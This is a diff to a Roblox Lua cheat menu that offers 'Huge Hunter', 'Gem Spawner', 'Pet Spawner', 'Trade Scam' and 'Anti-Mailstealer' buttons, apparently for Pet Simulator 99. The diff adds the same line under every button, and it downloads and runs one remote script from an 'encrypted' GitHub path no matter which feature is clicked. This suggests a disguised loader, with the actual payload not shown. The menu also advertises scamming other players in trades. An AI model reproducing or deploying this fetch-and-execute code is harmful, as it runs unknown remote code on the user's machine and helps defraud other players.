@@ -40,6 +40,7 @@ local Section1 = Window:CreateTab("Huge Hunter")
 local Button1 = Section1:CreateButton({
    Name = "Load Huge Hunter",
    Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
       print("Thanks For Using Evelynn Scripts - Huge Hunter")
    end,
 })
@@ -49,6 +50,7 @@ local Section2 = Window:CreateTab("Gem Spawner")
 local Button2 = Section2:CreateButton({
    Name = "Load Gem Spawner",
    Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
       print("Thanks For Using Evelynn Scripts - Gem Spawner")
    end,
 })
@@ -58,6 +60,7 @@ local Section3 = Window:CreateTab("Pet Spawner")
 local Button3 = Section3:CreateButton({
    Name = "Load Pet Spawner",
    Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
       print("Thanks For Using Evelynn Scripts - Pet Spawner")
    end,
 })
@@ -67,6 +70,7 @@ local Section4 = Window:CreateTab("Trade Scam")
 local Button4 = Section4:CreateButton({
    Name = "Load Trade Scam",
    Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
       print("Thanks For Using Evelynn Scripts - Trade Scam")
    end,
 })
@@ -76,6 +80,7 @@ local Section5 = Window:CreateTab("Anti Mailstealer")
 local Button5 = Section5:CreateButton({
    Name = "Save Anti-Mailstealer to executor",
    Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
       print("Thanks For Using Evelynn Scripts - Anti-Mailstealer")
    end,
 })
